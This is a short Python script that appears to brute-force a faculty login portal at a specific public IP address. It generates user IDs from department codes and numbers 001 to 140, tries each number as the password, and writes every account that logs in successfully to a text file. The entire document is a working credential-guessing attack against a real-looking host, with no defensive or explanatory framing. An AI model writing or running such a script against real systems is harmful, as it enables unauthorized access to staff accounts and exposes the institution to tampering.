import csv
import requests
branches = ['cse','it','ec','ee','me','mt','ce']
for branch in branches:
	for nos in range(1,141):
		nos = '{0:03}'.format(nos)
		f1 = open(str(branch)+'faculty'+'.txt',"a")
		values = {'user_id':str(branch)+str(nos), 'password': str(nos)}
		ra = requests.post("http://210.212.85.155/login/login.php", params=values)
		if str(ra.content).lower().find('upload notice') != -1:
			print str(branch)+str(nos) + "    "+ str(nos)+ "\n"
			f1.write(str(branch)+str(nos) + "    "+ str(nos)+ "\n")
	f1.close()